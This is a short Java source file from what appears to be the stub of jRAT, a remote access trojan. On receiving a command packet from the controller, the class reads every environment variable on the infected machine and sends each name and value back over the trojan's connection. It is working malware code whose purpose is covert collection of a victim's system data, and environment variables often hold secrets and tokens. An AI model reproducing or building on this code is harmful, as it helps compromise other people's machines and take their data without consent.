package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet32SystemProperties;

import java.util.Set;

public class Packet96EnvironmentVariables extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Set<String> set = System.getenv().keySet();
		for (String str : set) {
			con.addToSendQueue(new Packet32SystemProperties(str, System.getenv().get(str)));
		}
	}

}
